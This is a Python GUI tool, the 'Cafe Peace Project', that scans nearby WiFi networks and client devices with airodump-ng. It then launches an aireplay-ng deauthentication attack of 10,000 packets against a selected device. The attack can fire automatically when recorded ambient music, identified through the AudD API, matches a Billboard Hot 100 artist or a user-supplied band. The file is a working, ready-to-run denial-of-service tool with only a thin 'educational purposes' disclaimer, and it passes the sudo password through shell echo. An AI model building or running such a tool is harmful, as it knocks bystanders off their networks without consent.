from tkinter import *
import subprocess
import threading
import os
import requests
import glob
import re
import time
import csv
import shlex
import billboard


"""
This software is for educational purposes only. 
Use at your own discretion, the developers cannot be held responsible for any damages caused. 
Usage for attacking targets without prior mutual consent is illegal. 
It is the end user’s responsibility to obey all applicable local, state and federal laws. 
We assume no liability and are not responsible for any misuse or damage caused by this site.
"""

# root window
root = Tk()
root.title("Cafe Peace Project")
root.geometry("1725x1400")
root.configure(bg="#A7CCED")

# global vars
my_music = []
billboard_hot_100 = []

# functions
def get_api_key():
    input = ent_api.get()
    root.setvar(name="api_key", value=input)
    ent_api.delete("0", "end")


def get_sudo_pass():
    input = ent_pass.get()
    root.setvar(name="sudo_pass", value=input)
    ent_pass.delete("0", "end")


def get_wifi_interface():
    input = ent_wifi.get()
    root.setvar(name="wifi_interface", value=input)
    ent_wifi.delete("0", "end")


def set_wifi_adaptor():
    try:
        sudo = root.getvar(name="sudo_pass")
        wifi_interface = root.getvar(name="wifi_interface")
        command = f"echo {sudo} | sudo -S ip link set {wifi_interface} down"
        subprocess.run([command], shell=True)
        command_2 = f"echo {sudo} | sudo -S iw {wifi_interface} set monitor none"
        subprocess.run([command_2], shell=True)
        command_3 = f"echo {sudo} | sudo -S ip link set {wifi_interface} up"
        subprocess.run([command_3], shell=True)
    except Exception as e:
        print(
            "Problem putting wifi adaptor in monitor mode - did you enter sudo password and wifi interface?",
            e,
        )


def scan_all_networks():
    try:
        print("Scanning networks...")
        set_wifi_adaptor()
        sudo = root.getvar(name="sudo_pass")
        wifi_interface = root.getvar(name="wifi_interface")
        command = f"echo {sudo} | sudo -S timeout 60s airodump-ng -w scanned_networks --write-interval 20 --output-format csv {wifi_interface}"
        print(
            "echo password | sudo -S timeout 60s airodump-ng -w scanned_networks --write-interval 20 --output-format csv wifi_interface"
        )
        subprocess.run([command], shell=True, capture_output=True)
        display_networks()
    except Exception as e:
        print("Problem with network scan - did you enter sudo password and wifi interface?", e)


def display_networks():
    try:
        list_of_files = glob.glob("scanned_networks???.csv")
        filtered_files = [word for word in list_of_files if "scanned_networks" in word]
        if not filtered_files:
            text_1.insert(INSERT, "Scan first")
            text_1.insert(INSERT, "\n")
            return
        latest_file = max(filtered_files, key=os.path.getctime)
        with open(latest_file, "r") as fp:
            list_of_data = []
            csvreader = csv.reader(fp)
            for row in csvreader:
                list_of_data.append(row)
            for item in list_of_data:
                if len(item) == 15:
                    text_1.insert(
                        INSERT, f"{item[13].strip():35}  {item[0]:25}  {item[3]:8}"
                    )
                    text_1.bind("<Button-1>", handle_networks_click)
                    text_1.insert(INSERT, "\n")
    except Exception as e:
        print("Problem with displaying networks - check that file exists", e)


def scan_target_network_for_devices():
    try:
        print("Scanning devices...")
        sudo = root.getvar(name="sudo_pass")
        mac_address = root.getvar(name="network_mac")
        channel = root.getvar(name="network_channel")
        wifi_interface = root.getvar(name="wifi_interface")
        command_string = f"echo {sudo} | sudo -S timeout 60s airodump-ng --bssid {mac_address} --channel {channel} -w target_network --output-format csv {wifi_interface}"
        print(
            "echo password | sudo -S timeout 60s airodump-ng --bssid mac_address --channel channel -w target_network --output-format csv wifi_interface"
        )
        subprocess.run([command_string], shell=True, capture_output=True)
        display_devices()
    except Exception as e:
        print(
            "Select target MAC address and channel first - did you enter sudo password and wifi interface?",
            e,
        )


def display_devices():
    try:
        list_of_files = glob.glob("target_network???.csv")
        filtered_files = [word for word in list_of_files if "target_network" in word]
        if not filtered_files:
            text_2.insert(INSERT, "Scan first")
            text_2.insert(INSERT, "\n")
            return
        latest_file = max(filtered_files, key=os.path.getctime)
        with open(latest_file, "r") as fp:
            list_of_data = []
            csvreader = csv.reader(fp)
            for row in csvreader:
                list_of_data.append(row)
            for item in list_of_data:
                if item:
                    text_2.insert(INSERT, f"{item[0]:25}")
                    text_2.bind("<Button-1>", handle_devices_click)
                    text_2.insert(INSERT, "\n")
    except Exception as e:
        print("Problem displaying device - check that file exists", e)


def handle_networks_click(event):
    row_string = text_1.get("current linestart", "current lineend")
    row_string_arr = re.split(r"\s{5,}", row_string)
    root.setvar(name="network_essid", value=row_string_arr[0])
    root.setvar(name="network_mac", value=row_string_arr[1])
    root.setvar(name="network_channel", value=row_string_arr[2])
    mac_address = root.getvar(name="network_mac")
    channel = root.getvar(name="network_channel")
    essid = root.getvar(name="network_essid")
    text_3.insert(
        INSERT, f"Network: {essid}\nRouter MAC: {mac_address}\nChannel: {channel}"
    )


def handle_devices_click(event):
    row_string = text_2.get("current linestart", "current lineend")
    root.setvar(name="target_mac", value=row_string.strip())
    target_mac = root.getvar(name="target_mac")
    text_3.insert(INSERT, f"\nDevice MAC: {target_mac:30}")


def clear_networks():
    text_1.delete("1.0", END)


def clear_devices():
    text_2.delete("1.0", END)


def clear_target():
    text_3.delete("1.0", END)


def deauth_attack():
    try:
        print("Attacking...")
        sudo = root.getvar(name="sudo_pass")
        target_mac = root.getvar(name="target_mac")
        network_mac = root.getvar(name="network_mac")
        wifi_interface = root.getvar(name="wifi_interface")
        command_string = f"echo {sudo} | sudo -S aireplay-ng -D -0 10000 -a {network_mac} -c {target_mac} {wifi_interface}"
        print(
            "echo password | sudo -S aireplay-ng -D -0 10000 -a network_mac -c target_mac wifi_interface"
        )
        subprocess.run([command_string], shell=True, capture_output=True)
    except Exception as e:
        print(
            "Problem with deauth attack - did you enter sudo password and wifi interface?",
            e,
        )


def stop_attack():
    quit()


def make_recording():
    print("Recording...")
    subprocess.run(shlex.split("arecord -d 10 -f cd -t wav the_song.wav"))


def make_api_call():
    try:
        print("Making API call...")
        api_token = root.getvar(name="api_key")
        api_url = "https://api.audd.io/"
        data = {"api_token": api_token}
        files = {
            "file": open("the_song.wav", "rb"),
        }
        response = requests.post(api_url, data=data, files=files)
        response_dict = response.json()
        if response_dict.get("result"):
            artist = response_dict.get("result").get("artist")
            root.setvar(name="current_artist", value=artist)
        else:
            root.setvar(name="current_artist", value="Not identified")
    except Exception as e:
        print("Problem making API call - did you enter your api key?", e)


def scan_music():
    isMatch = False
    while not isMatch:
        print("Scanning music...")
        make_recording()
        make_api_call()
        isMatch = find_artist()
        if isMatch:
            print("Scan over")
            break
        time.sleep(60)
    run_threaded_three()


def find_artist():
    try:
        print("Checking for music match...")
        current_artist = root.getvar(name="current_artist")
        print("Music is ", current_artist)
        if current_artist in billboard_hot_100:
            print(f"Match on band - {current_artist}")
            return True
        elif current_artist in my_music:
            print(f"Match on band - {current_artist}")
            return True
        else:
            print("No match, continue scan")
            return False
    except Exception as e:
        print("Problem finding artist", e)


def get_billboard_100():
    chart = billboard.ChartData("hot-100")
    for entry in chart:
        billboard_hot_100.append(entry.artist)
        text_4.insert(INSERT, f"{entry.artist}, ")


def add_music():
    input = ent_band.get().strip()
    global my_music
    my_music.append(input)
    if my_music.index(input) == 0:
        text_5.insert(INSERT, f"{input}")
    else:
        text_5.insert(INSERT, f", {input}")
    ent_band.delete("0", "end")


def run_threaded(event=None):
    threading.Thread(target=scan_all_networks, daemon=True).start()


def run_threaded_two(event=None):
    threading.Thread(target=scan_target_network_for_devices, daemon=True).start()


def run_threaded_three(event=None):
    threading.Thread(target=deauth_attack, daemon=True).start()


def run_threaded_four(event=None):
    threading.Thread(target=scan_music, daemon=True).start()


def run_threaded_five(event=None):
    threading.Thread(target=get_billboard_100, daemon=True).start()


# button labels
lab_1 = Label(root, bg="#A7CCED", text="Scan networks", font="bold")
lab_1.grid(row=0, column=0, sticky=W, pady=2, padx=2, rowspan=1)

lab_2 = Label(root, bg="#A7CCED", text="Scan target network", font="bold")
lab_2.grid(row=0, column=2, sticky=W, pady=2, padx=2, rowspan=1)

lab_3 = Label(root, bg="#A7CCED", text="Display networks", font="bold")
lab_3.grid(row=1, column=0, sticky=W, pady=2, padx=2, rowspan=1)

lab_4 = Label(root, bg="#A7CCED", text="Display devices", font="bold")
lab_4.grid(row=1, column=2, sticky=W, pady=2, padx=2, rowspan=1)

lab_5 = Label(root, bg="#A7CCED", text="Scan music", font="bold")
lab_5.grid(row=2, column=0, sticky=W, pady=2, padx=2, rowspan=1)

lab_6 = Label(root, bg="#A7CCED", text="Clear networks", font="bold")
lab_6.grid(row=2, column=2, sticky=W, pady=(10, 2), padx=2)

lab_7 = Label(root, bg="#A7CCED", text="Clear devices", font="bold")
lab_7.grid(row=3, column=0, sticky=W, pady=(10, 2), padx=2)

lab_8 = Label(root, bg="#A7CCED", text="Clear target", font="bold")
lab_8.grid(row=3, column=2, sticky=W, pady=(10, 2), padx=2)

lab_9 = Label(root, bg="#A7CCED", text="Deauth attack", font="bold")
lab_9.grid(row=4, column=0, sticky=W, pady=2, padx=2, rowspan=1)

lab_10 = Label(root, bg="#A7CCED", text="Get Hot 100", font="bold")
lab_10.grid(row=4, column=2, sticky=W, pady=2, padx=2, rowspan=1)

# display networks
lab_11 = Label(root, bg="#A7CCED", text="Networks", font="bold")
lab_11.grid(row=5, column=1, pady=(10, 2), padx=2)
text_1 = Text(root, width=75, height=15)
text_1.grid(columnspan=4)

# display devices
lab_12 = Label(root, bg="#A7CCED", text="Devices", font="bold")
lab_12.grid(row=5, column=5, pady=(10, 2), padx=2)
text_2 = Text(root, width=32, height=15)
text_2.grid(row=6, column=5, rowspan=5)

# display target
lab_13 = Label(root, bg="#A7CCED", text="Target", font="bold")
lab_13.grid(row=0, column=5, padx=2)
text_3 = Text(root, width=32, height=5)
text_3.grid(row=1, column=5, rowspan=3)

# password entry
lab_14 = Label(root, bg="#A7CCED", text="sudo pass", font="bold")
lab_14.grid(column=0, pady=(10, 4), padx=4, sticky=W)
ent_pass = Entry(root, width=20)
ent_pass.grid(row=11, column=1, rowspan=1, columnspan=1, sticky=W)

lab_15 = Label(root, bg="#A7CCED", text="Stop attack", font="bold")
lab_15.grid(row=11, column=3, pady=(10, 4), sticky=W, columnspan=2)

# api key entry
lab_16 = Label(root, bg="#A7CCED", text="API key", font="bold")
lab_16.grid(row=12, column=0, pady=4, padx=4, sticky=W)
ent_api = Entry(root, width=20)
ent_api.grid(row=12, column=1, rowspan=1, columnspan=1, sticky=W)

# band entry
lab_17 = Label(root, bg="#A7CCED", text="Add music", font="bold")
lab_17.grid(row=12, column=3, sticky=W, columnspan=1, rowspan=1)
ent_band = Entry(root, width=20)
ent_band.grid(row=12, column=5, rowspan=1, columnspan=1, sticky=W)

# wifi interface entry
lab_18 = Label(root, bg="#A7CCED", text="Wifi interface", font="bold")
lab_18.grid(row=13, column=0, pady=4, padx=4, sticky=W)
ent_wifi = Entry(root, width=20)
ent_wifi.grid(row=13, column=1, rowspan=1, columnspan=1, sticky=W)

# display billboard hot 100
lab_19 = Label(root, bg="#A7CCED", text="Billboard Hot 100", font="bold")
lab_19.grid(column=2, pady=4)
text_4 = Text(root, width=100, height=4)
text_4.grid(column=0, rowspan=3, columnspan=6)

# display my music
lab_20 = Label(root, bg="#A7CCED", text="My Music", font="bold")
lab_20.grid(column=2, pady=4)
text_5 = Text(root, width=100, height=4)
text_5.grid(column=0, rowspan=3, columnspan=6)

# button scan networks
btn_1 = Button(root, bg="#f39c12", fg="black", width="3", command=run_threaded)
btn_1.grid(column=1, row=0, pady=2)

# button scan target network
btn_2 = Button(root, fg="black", bg="#f39c12", width="3", command=run_threaded_two)
btn_2.grid(column=3, row=0, pady=2)

# button display networks
btn_3 = Button(root, fg="black", bg="#f39c12", width="3", command=display_networks)
btn_3.grid(column=1, row=1, pady=2)

# button display devices
btn_4 = Button(root, fg="black", bg="#f39c12", width="3", command=display_devices)
btn_4.grid(column=3, row=1, pady=2)

# button scan music
btn_5 = Button(root, fg="black", bg="#f39c12", width="3", command=run_threaded_four)
btn_5.grid(column=1, row=2, pady=2)

# button clear networks window
btn_6 = Button(root, fg="black", bg="#f39c12", width="3", command=clear_networks)
btn_6.grid(column=3, row=2, pady=2)

# button clear devices window
btn_7 = Button(root, fg="black", bg="#f39c12", width="3", command=clear_devices)
btn_7.grid(column=1, row=3, pady=2)

# button clear target window
btn_8 = Button(root, fg="black", bg="#f39c12", width="3", command=clear_target)
btn_8.grid(column=3, row=3, pady=2)

# button deauth attack
btn_9 = Button(root, fg="black", bg="#f39c12", width="3", command=run_threaded_three)
btn_9.grid(column=1, row=4, pady=2)

# button get billboard hot 100
btn_10 = Button(root, fg="black", bg="#f39c12", width="3", command=run_threaded_five)
btn_10.grid(column=3, row=4, pady=2)

# button get sudo pass
btn_11 = Button(root, fg="black", bg="#f39c12", width="3", command=get_sudo_pass)
btn_11.grid(column=2, row=11, pady=2)

# button get api key
btn_12 = Button(root, fg="black", bg="#f39c12", width="3", command=get_api_key)
btn_12.grid(column=2, row=12, pady=2)

# button get wifi_interface
btn_13 = Button(root, fg="black", bg="#f39c12", width="3", command=get_wifi_interface)
btn_13.grid(column=2, row=13, pady=2)

# button stop attack
btn_14 = Button(root, fg="black", bg="#EE4B2B", width="3", command=stop_attack)
btn_14.grid(column=5, row=11, pady=2, sticky=E)

# button add music
btn_15 = Button(root, fg="black", bg="#f39c12", width="3", command=add_music)
btn_15.grid(column=5, row=12, pady=2, sticky=E)

if __name__ == "__main__":
    root.mainloop()
